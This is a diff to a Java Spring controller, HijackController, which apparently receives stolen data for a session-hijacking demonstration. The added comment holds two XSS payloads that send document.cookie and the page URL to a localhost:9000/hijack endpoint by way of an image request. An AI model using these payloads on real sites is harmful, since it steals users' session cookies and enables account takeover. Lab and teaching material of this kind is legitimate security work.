@@ -15,6 +15,11 @@ public class HijackController {
 
     private static Log log = LogFactory.getLog(HijackController.class);
 
+    /**
+     * Call from a XSS vulnerability using one of the following techniques.
+     * - document.write("<img src='http://localhost:9000/hijack?url=" + encodeURIComponent(window.location.href) + "&cookies=" + encodeURIComponent(document.cookie) + "' />");
+     * - document.createElement("img").src="http://localhost:9000/hijack?url=" + encodeURIComponent(window.location.href) + "&cookies=" + encodeURIComponent(document.cookie) + "' />"
+     */
     @RequestMapping("/hijack")
     @ResponseBody
     public void hijack(@RequestParam(value="url", required=false) String url,
